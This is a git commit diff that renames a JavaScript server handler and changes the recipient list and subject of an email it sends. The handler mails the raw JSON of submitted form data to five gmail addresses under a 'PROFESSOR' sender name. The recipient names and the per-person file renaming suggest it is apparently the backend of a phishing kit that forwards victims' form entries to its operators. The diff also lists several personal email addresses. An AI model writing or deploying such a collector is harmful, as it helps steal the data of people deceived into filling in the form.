cf2acc3deccabf71dea532e8abcde8b3e7d5762f
evantiktok617-coder <evantiktok617@gmail.com>
2026-07-29 23:45:15 +0500

    Update and rename furqan.js to fida.js

--- fida.js
+++ fida.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,furqannizamani68@gmail.com,grubfah@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com",
-      subject: "Furqan",
+      to: "linkquarry@gmail.com,fidaf2087@gmail.com,grubfah@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com",
+      subject: "fida",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Asif Link</h3><pre>${JSON.stringify(
         formData,
